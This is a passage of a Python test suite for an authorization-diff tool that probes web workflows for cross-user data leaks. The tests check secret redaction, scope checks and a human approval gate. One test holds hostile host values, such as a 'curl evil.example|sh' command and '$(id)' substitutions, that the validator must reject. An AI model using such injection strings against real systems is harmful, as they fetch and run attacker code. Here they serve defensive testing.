    assert r.verdict == "DIFFERENT", r.detail


# --- fourth review round: a degenerate owner baseline can never become a leak --

def _degenerate_run(owner_body, other_body=None, own_b_body=None):
    other_body = other_body or owner_body
    s = Script({
        ("owner", S1): _step1("ref-A"), ("owner", S2_A): owner_body, ("other", S2_A): other_body,
        ("none", S2_A): FetchResult(status=401, body=""),
        ("other", S1): _step1("ref-B"),
        ("other", S2_B): own_b_body or _ok('{"orders": [{"id": "o1", "sku": "abc123"}]}'),
    }, default=FetchResult(status=500, body=""))
    return authz_diff.run_two_step(WF, O, B, fetch_fn=s), s


@pytest.mark.parametrize("body", [
    '{"orders": []}', "[]", "{}", "null", '{"orders": [], "total": 0, "status": ""}',
    '{"orders": [], "ok": true, "error": null}', '{"orders": [], "status": "ok"}',
    '{"orders": [], "total": 0, "status": "ok"}',  # a zero is a default value, not content
])
def test_an_owner_baseline_with_no_real_content_is_inconclusive_never_a_leak(body):
    r, s = _degenerate_run(_ok(body))
    assert r.verdict == "INCONCLUSIVE" and "informative" in r.detail, r.detail
    assert [c["who"] for c in s.calls] == ["owner", "owner", "other"]  # stops before the controls


def test_a_short_plain_text_baseline_is_inconclusive():
    r, _ = _degenerate_run(_ok("ok"))
    assert r.verdict == "INCONCLUSIVE"


def test_a_substantive_plain_text_baseline_still_reaches_the_controls():
    r, s = _degenerate_run(_ok("ORDER-DETAIL-42-SECRET"), own_b_body=_ok("ORDER-DETAIL-43-OTHER"))
    assert r.verdict == "LEAKED", r.detail


def test_masking_does_not_let_constant_zero_or_empty_fields_count_as_stable_content():
    owner = lambda n: _ok(json.dumps({"orders": [], "total": 0, "ts": f"t{n}"}))  # noqa: E731
    other = _ok(json.dumps({"orders": [], "total": 0, "ts": "t99"}))
    r = authz_diff.run_two_step(WF, O, B, fetch_fn=_masked_leak_table(owner, other, _ok('{"id": "Y"}')))
    assert r.verdict == "INCONCLUSIVE" and "stable" in r.detail, r.detail


def test_protected_is_still_reported_for_an_empty_owner_object():
    s = Script({("owner", S1): _step1("ref-A"), ("owner", S2_A): _ok("{}"),
                ("other", S2_A): FetchResult(status=403, body="")}, default=FetchResult(status=500, body=""))
    assert authz_diff.run_two_step(WF, O, B, fetch_fn=s).verdict == "PROTECTED"


# --- evidence hygiene --------------------------------------------------------

def test_masked_paths_never_carry_a_credential_used_as_a_json_key():
    token = "opaquetok-123456"
    owner = lambda n: _ok(json.dumps({"id": "X", "k": 1, "sessions": {token: {"last_seen": f"t{n}"}}}))  # noqa: E731
    other = _ok(json.dumps({"id": "X", "k": 1, "sessions": {token: {"last_seen": "t99"}}}))
    s = Script({
        ("owner", S1): _step1("ref-A"), ("owner", S2_A): owner, ("other", S2_A): other,
        ("none", S2_A): FetchResult(status=403, body=""),
        ("other", S1): _step1("ref-B"), ("other", S2_B): _ok('{"id": "Y", "k": 2}'),
    }, default=FetchResult(status=500, body=""))
    r = authz_diff.run_two_step(WF, {"Authorization": f"Bearer {token}"}, B, fetch_fn=s)
    assert r.verdict == "LEAKED", r.detail
    assert token not in json.dumps(r.to_dict())


def test_masked_paths_are_rfc6901_escaped_for_slash_and_tilde_keys():
    owner = lambda n: _ok(json.dumps({"id": "X", "k": 1, "m": {"a/b~c": f"t{n}"}}))  # noqa: E731
    other = _ok(json.dumps({"id": "X", "k": 1, "m": {"a/b~c": "t99"}}))
    r = authz_diff.run_two_step(WF, O, B, fetch_fn=_masked_leak_table(owner, other, _ok('{"id": "Y", "k": 2}')))
    assert r.verdict == "LEAKED" and r.evidence["masked_paths"] == ["/m/a~1b~0c"]


def test_normalize_body_survives_absurdly_deep_json():
    assert isinstance(authz_diff.normalize_body("[" * 100000), str)


def test_non_secret_cookie_values_survive_in_evidence_but_the_secret_one_is_scrubbed():
    body = _ok(json.dumps({"id": "X", "k": 1, "note": "theme darkmode ok", "echo": "SECRETSESSIONVALUE"}))
    s = Script({
        ("owner", S1): _step1("ref-A"), ("owner", S2_A): body, ("other", S2_A): body,
        ("none", S2_A): FetchResult(status=403, body=""),
        ("other", S1): _step1("ref-B"), ("other", S2_B): _ok('{"id": "Y", "k": 2}'),
    }, default=FetchResult(status=500, body=""))
    r = authz_diff.run_two_step(WF, {"Cookie": "theme=darkmode; sid=SECRETSESSIONVALUE"}, B, fetch_fn=s)
    assert r.verdict == "LEAKED", r.detail
    assert "SECRETSESSIONVALUE" not in json.dumps(r.to_dict())
    assert "darkmode" in r.evidence["owner_view"]


def test_a_secret_named_carried_path_never_stores_the_raw_value():
    wf = authz_diff.Workflow(step1_url=S1, carried_path="items.0.reset_token", step2_url_template=S2)
    step1 = _ok(json.dumps({"items": [{"reset_token": "rt-abcdef123456"}]}))
    url = "http://127.0.0.1:9/a/obj/rt-abcdef123456"
    same = _ok('{"id": "X", "k": 1}')
    s = Script({
        ("owner", S1): step1, ("owner", url): same, ("other", url): same,
        ("none", url): FetchResult(status=403, body=""),
        ("other", S1): _ok(json.dumps({"items": [{"reset_token": "rt-zzzzzz999999"}]})),
        ("other", "http://127.0.0.1:9/a/obj/rt-zzzzzz999999"): _ok('{"id": "Y", "k": 2}'),
    }, default=FetchResult(status=500, body=""))
    r = authz_diff.run_two_step(wf, O, B, fetch_fn=s)
    assert r.verdict == "LEAKED", r.detail
    assert "rt-abcdef123456" not in json.dumps(r.to_dict())


# --- fifth review round -------------------------------------------------------

@pytest.mark.parametrize("method", ["TRACE", "CONNECT", "", "   ", "FOO"])
def test_a_method_nobody_could_approve_is_a_structural_error_not_a_request_for_confirmation(method):
    wf = authz_diff.Workflow(step1_url=S1, carried_path="items.0.ref", step2_url_template=S2, step2_method=method)
    assert authz_diff.structural_error(wf, O, B)[0] == "ERROR"
    s = Script({})
    assert authz_diff.run_two_step(wf, O, B, fetch_fn=s).verdict == "ERROR" and s.calls == []


def test_userinfo_in_a_workflow_url_is_rejected_before_anything_else():
    wf = authz_diff.Workflow(step1_url="http://u:pw@127.0.0.1:9/a/refs", carried_path="x",
                             step2_url_template="http://u:pw@127.0.0.1:9/a/obj/{carried}")
    err = authz_diff.structural_error(wf, O, B)
    assert err and err[0] == "ERROR" and "pw" not in err[1]


def test_approval_host_is_lowercase_hostname_plus_explicit_port():
    assert authz_diff.approval_host("https://API.Target.com:8443/x") == "api.target.com:8443"
    assert authz_diff.approval_host("https://api.target.com/x") == "api.target.com"
    assert authz_diff.approval_host("http://[::1]:8080/x") == "[::1]:8080"


def test_a_secret_id_is_never_stored_raw_wherever_the_secret_named_segment_is():
    wf = authz_diff.Workflow(step1_url=S1, carried_path="items.0.reset_token.value", step2_url_template=S2)
    step1 = _ok(json.dumps({"items": [{"reset_token": {"value": "rt-abcdef123456"}}]}))
    url = "http://127.0.0.1:9/a/obj/rt-abcdef123456"
    same = _ok('{"id": "X", "k": 1}')
    s = Script({
        ("owner", S1): step1, ("owner", url): same, ("other", url): same,
        ("none", url): FetchResult(status=403, body=""),
        ("other", S1): _ok(json.dumps({"items": [{"reset_token": {"value": "rt-zzzzzz999999"}}]})),
        ("other", "http://127.0.0.1:9/a/obj/rt-zzzzzz999999"): _ok('{"id": "Y", "k": 2}'),
    }, default=FetchResult(status=500, body=""))
    r = authz_diff.run_two_step(wf, O, B, fetch_fn=s)
    assert r.verdict == "LEAKED", r.detail
    assert "rt-abcdef123456" not in json.dumps(r.to_dict())


def test_a_bare_session_cookie_value_is_scrubbed_from_evidence():
    body = _ok(json.dumps({"id": "X", "k": 1, "note": "echo SESSVALUE123456"}))
    s = Script({
        ("owner", S1): _step1("ref-A"), ("owner", S2_A): body, ("other", S2_A): body,
        ("none", S2_A): FetchResult(status=403, body=""),
        ("other", S1): _step1("ref-B"), ("other", S2_B): _ok('{"id": "Y", "k": 2}'),
    }, default=FetchResult(status=500, body=""))
    r = authz_diff.run_two_step(WF, {"Cookie": "PHPSESSID=SESSVALUE123456; theme=darkmode"}, B, fetch_fn=s)
    assert r.verdict == "LEAKED", r.detail
    assert "SESSVALUE123456" not in json.dumps(r.to_dict())


# --- sixth review round --------------------------------------------------------

@pytest.mark.parametrize("host", [
    "x;curl evil.example|sh;y.example.com", "$(id).example.com", "`id`.example.com", "a b.example.com",
    "host.example.com:99999", "host.example.com:abc", "-bad.example.com", "ex'ample.com", "exa\"mple.com",
])
def test_hostile_or_malformed_hosts_are_a_structural_error(host):
    wf = authz_diff.Workflow(step1_url=f"https://{host}/r", carried_path="x",
                             step2_url_template=f"https://{host}/o/{{carried}}")
    err = authz_diff.structural_error(wf, O, B)
    assert err and err[0] == "ERROR"


@pytest.mark.parametrize("host", ["api.example.com", "API.Example.com:8443", "127.0.0.1:9", "[::1]:8080", "a-b.c-d.example.org"])
def test_ordinary_hosts_are_accepted(host):
    wf = authz_diff.Workflow(step1_url=f"https://{host}/r", carried_path="x",
                             step2_url_template=f"https://{host}/o/{{carried}}")
    assert authz_diff.structural_error(wf, O, B) is None


def test_approval_host_never_raises_on_a_bad_port():
    assert authz_diff.approval_host("https://host.example.com:99999/x") == ""


def test_the_same_credentials_for_both_identities_is_an_error():
    same = {"Authorization": "Bearer o"}
    err = authz_diff.structural_error(WF, same, {"authorization": " Bearer o "})
    assert err and err[0] == "ERROR" and "same" in err[1].lower()
    s = Script({})
    assert authz_diff.run_two_step(WF, same, dict(same), fetch_fn=s).verdict == "ERROR" and s.calls == []


def test_scope_precheck_reports_an_out_of_scope_workflow_without_any_request(monkeypatch):
    monkeypatch.setattr(scope_guard, "load_engagement",
                        lambda path=None: scope_guard.Engagement(target="x", in_scope=["only.invalid"]))
    wf = authz_diff.Workflow(step1_url="http://target.invalid/refs", carried_path="r",
                             step2_url_template="http://target.invalid/o/{carried}")
    assert authz_diff.scope_precheck(wf) and "scope" in authz_diff.scope_precheck(wf).lower()
    assert authz_diff.scope_precheck(authz_diff.Workflow(
        step1_url="http://127.0.0.1:9/r", carried_path="r", step2_url_template="http://127.0.0.1:9/o/{carried}")) is None


def test_an_id_placed_under_a_secret_named_query_parameter_is_never_shown_raw():
    wf = authz_diff.Workflow(step1_url=S1, carried_path="items.0.ref",
                             step2_url_template="http://127.0.0.1:9/a/obj?access_token={carried}")
    url = "http://127.0.0.1:9/a/obj?access_token=ref-A1b2c3"
    same = _ok('{"id": "X", "k": 1}')
    s = Script({
        ("owner", S1): _step1("ref-A1b2c3"), ("owner", url): same, ("other", url): same,
        ("none", url): FetchResult(status=403, body=""),
        ("other", S1): _step1("ref-B9z8y7"),
        ("other", "http://127.0.0.1:9/a/obj?access_token=ref-B9z8y7"): _ok('{"id": "Y", "k": 2}'),
    }, default=FetchResult(status=500, body=""))
    r = authz_diff.run_two_step(wf, O, B, fetch_fn=s)
    assert r.verdict == "LEAKED", r.detail
    assert "ref-A1b2c3" not in json.dumps(r.to_dict())


# --- step-1 request body (create-then-read workflows) -----------------------------

APPROVE_POST = {"methods": ["POST"], "reason": "r", "authorized_by": "h"}
BODY = '{"title": "quarterly plan", "note": "pw=hunter2hunter2"}'


def _create_wf(**kw):
    return authz_diff.Workflow(step1_url=S1, carried_path="items.0.ref", step2_url_template=S2,
                               step1_method="POST", step1_body=BODY, **kw)


@pytest.mark.parametrize("wf", [
    authz_diff.Workflow(step1_url=S1, carried_path="x", step2_url_template=S2, step1_body='{"a": 1}'),   # GET + body
    authz_diff.Workflow(step1_url=S1, carried_path="x", step2_url_template=S2, step1_method="POST",
                        step1_body="not json"),
    authz_diff.Workflow(step1_url=S1, carried_path="x", step2_url_template=S2, step1_method="POST",
                        step1_body='{"pad": "' + "a" * 5000 + '"}'),
    authz_diff.Workflow(step1_url=S1, carried_path="x", step2_url_template=S2, step1_method="POST",
                        step1_body='{"id": "{carried}"}'),
    authz_diff.Workflow(step1_url=S1, carried_path="x", step2_url_template=S2, step1_method="POST",
                        step1_body="   "),
])
def test_an_unusable_step1_body_is_a_structural_error(wf):
    assert authz_diff.structural_error(wf, O, B)[0] == "ERROR"


def test_a_json_body_on_a_state_changing_step1_is_structurally_fine():
    assert authz_diff.structural_error(_create_wf(), O, B) is None


def _create_script(status=201):
    same = _ok('{"id": "X", "k": 1, "name": "alpha"}')
    return Script({
        ("owner", S1): FetchResult(status=status, body=json.dumps({"items": [{"ref": "ref-A"}]})),
        ("owner", S2_A): same, ("other", S2_A): same,
        ("none", S2_A): FetchResult(status=401, body=""),
        ("other", S1): FetchResult(status=status, body=json.dumps({"items": [{"ref": "ref-B"}]})),
        ("other", S2_B): _ok('{"id": "Y", "k": 2, "name": "bravo"}'),
    }, default=FetchResult(status=500, body=""))


def test_step1_sends_the_body_with_a_json_content_type_and_nothing_else_does():
    s = _create_script()
    r = authz_diff.run_two_step(_create_wf(), O, B, fetch_fn=s, approval=APPROVE_POST)
    assert r.verdict == "LEAKED", r.detail
    step1 = [c for c in s.calls if c["url"] == S1]
    assert step1 and all(c["body"] == BODY and c["headers"].get("Content-Type") == "application/json" for c in step1)
    others = [c for c in s.calls if c["url"] != S1]
    assert others and all(c["body"] is None and "Content-Type" not in c["headers"] for c in others)


def test_a_201_created_step1_is_accepted_but_other_failures_are_not():
    assert authz_diff.run_two_step(_create_wf(), O, B, fetch_fn=_create_script(201), approval=APPROVE_POST).verdict == "LEAKED"
    r = authz_diff.run_two_step(_create_wf(), O, B, fetch_fn=_create_script(500), approval=APPROVE_POST)
    assert r.verdict == "BASELINE_FAILED"


def test_the_body_never_appears_in_the_result_or_evidence():
    r = authz_diff.run_two_step(_create_wf(), O, B, fetch_fn=_create_script(), approval=APPROVE_POST)
    blob = json.dumps(r.to_dict())
    assert "hunter2hunter2" not in blob and "quarterly plan" not in blob
    assert r.evidence["conditions"]["step1_body"].startswith("sha256:")


def test_a_step1_post_with_a_body_still_needs_the_human_gate():
    s = _create_script()
    r = authz_diff.run_two_step(_create_wf(), O, B, fetch_fn=s)  # no approval
    assert r.verdict == "BLOCKED" and s.calls == []


# --- seventh review round: body validation and fingerprint --------------------------------

def _body_wf(body, method="POST"):
    return authz_diff.Workflow(step1_url=S1, carried_path="x", step2_url_template=S2, step1_method=method,
                               step1_body=body)


LONE_SURROGATE_BODY = '"' + chr(0xD800) + '"'


@pytest.mark.parametrize("wf", [
    _body_wf(LONE_SURROGATE_BODY),
    _body_wf('{"a": 1}', "DELETE"),
    _body_wf('{"a": NaN}'), _body_wf('{"a": Infinity}'), _body_wf('[-Infinity]'),
])
def test_step1_body_edge_cases_are_a_structural_error_not_an_exception(wf):
    err = authz_diff.structural_error(wf, O, B)
    assert err and err[0] == "ERROR"


def test_post_put_and_patch_bodies_are_fine():
    for m in ("POST", "PUT", "PATCH"):
        assert authz_diff.structural_error(_body_wf('{"a": 1}', m), O, B) is None


def test_the_workflow_fingerprint_binds_methods_urls_and_body_and_hides_the_body():
    base = _body_wf('{"title": "t"}')
    fp = authz_diff.workflow_fingerprint(base)
    assert len(fp) == 32 and fp == authz_diff.workflow_fingerprint(_body_wf('{"title": "t"}'))
    assert fp != authz_diff.workflow_fingerprint(_body_wf('{"title": "u"}'))
    assert fp != authz_diff.workflow_fingerprint(_body_wf('{"title": "t"}', "PUT"))
    other_url = authz_diff.Workflow(step1_url=S1 + "x", carried_path="x", step2_url_template=S2,
                                    step1_method="POST", step1_body='{"title": "t"}')
    assert fp != authz_diff.workflow_fingerprint(other_url)
    assert "title" not in authz_diff.workflow_summary(base) and "sha256:" in authz_diff.workflow_summary(base)


def test_the_fingerprint_binds_the_step2_url_and_the_carried_path_too():
    base = _body_wf('{"title": "t"}')
    fp = authz_diff.workflow_fingerprint(base)
    other_step2 = authz_diff.Workflow(step1_url=S1, carried_path="x", step2_url_template=S2 + "/extra",
                                      step1_method="POST", step1_body='{"title": "t"}')
    other_path = authz_diff.Workflow(step1_url=S1, carried_path="y", step2_url_template=S2,
                                     step1_method="POST", step1_body='{"title": "t"}')
    other_m2 = authz_diff.Workflow(step1_url=S1, carried_path="x", step2_url_template=S2, step1_method="POST",
                                   step1_body='{"title": "t"}', step2_method="POST")
    assert len({fp, authz_diff.workflow_fingerprint(other_step2), authz_diff.workflow_fingerprint(other_path),
                authz_diff.workflow_fingerprint(other_m2)}) == 4


def test_redact_body_redacts_secret_keys_even_when_the_body_has_a_huge_integer():
    body = '{"payment_token": "tok_live_SECRET123", "n": ' + "9" * 5000 + "}"
    assert "tok_live_SECRET123" not in authz_diff.redact_body(body)


def test_a_huge_integer_body_does_not_break_comparison_or_masking():
    body = '{"id": "X", "k": 1, "big": ' + "9" * 5000 + "}"
    assert authz_diff.normalize_body(body) is not None
    assert authz_diff._json_leaves(body) is None or isinstance(authz_diff._json_leaves(body), dict)


def test_the_fingerprint_is_128_bits_and_covers_the_two_identities():
    wf = _body_wf('{"title": "t"}')
    fp = authz_diff.workflow_fingerprint(wf, O, B)
    assert len(fp) == 32 and all(c in "0123456789abcdef" for c in fp)
    assert fp == authz_diff.workflow_fingerprint(wf, O, B)
    assert fp != authz_diff.workflow_fingerprint(wf, B, O)                          # swapped identities
    assert fp != authz_diff.workflow_fingerprint(wf, {"Authorization": "Bearer x"}, B)  # another owner
    assert fp != authz_diff.workflow_fingerprint(wf, O, {"Authorization": "Bearer y"})  # another 'other'
    assert fp != authz_diff.workflow_fingerprint(wf)                                 # no identities at all


def test_the_summary_names_the_identities_by_short_hash_never_by_value():
    s = authz_diff.workflow_summary(_body_wf('{"a": 1}'), O, B)
    assert "owner id " in s and "other id " in s and "Bearer" not in s and "o" != s


# --- final security review: the human must be able to see the whole request ------------------------

def _long_wf(n1=100, n2=100):
    q = "&".join(f"p{i}=v{i}" for i in range(n1))
    return authz_diff.Workflow(step1_url=f"http://api.t.com/drafts?{q}", carried_path="id",
                               step2_url_template="http://api.t.com/admin/users/{carried}/delete?" + "x" * n2,
                               step1_method="POST", step2_method="DELETE")


def test_step_urls_longer_than_the_display_cap_are_a_structural_error():
    err = authz_diff.structural_error(_long_wf(), O, B)
    assert err and err[0] == "ERROR" and "long" in err[1].lower()
    short = authz_diff.Workflow(step1_url="http://api.t.com/" + "a" * 250, carried_path="x",
                                step2_url_template="http://api.t.com/o/{carried}")
    assert authz_diff.structural_error(short, O, B) is None


def test_the_summary_leads_with_methods_host_and_identities_before_any_url():
    wf = authz_diff.Workflow(step1_url="http://api.t.com/drafts", carried_path="id",
                             step2_url_template="http://api.t.com/o/{carried}", step1_method="POST",
                             step2_method="DELETE", step1_body='{"a": 1}')
    s = authz_diff.workflow_summary(wf, O, B)
    assert s.startswith("DELETE+POST on api.t.com;")
    assert s.index("owner id") < s.index("step 1:") < s.index("step 2:")
    assert "twice" in s.lower() or "sent by the owner" in s.lower()


def test_the_longest_allowed_workflow_still_has_a_summary_within_the_prompt_limit():
    wf = authz_diff.Workflow(step1_url="http://api.t.com/" + "a" * 280, carried_path="id" * 60,
                             step2_url_template="http://api.t.com/" + "b" * 270 + "/{carried}",
                             step1_method="POST", step2_method="DELETE", step1_body='{"a": 1}')
    assert authz_diff.structural_error(wf, O, B) is None
    assert len(authz_diff.workflow_summary(wf, O, B)) <= 1400
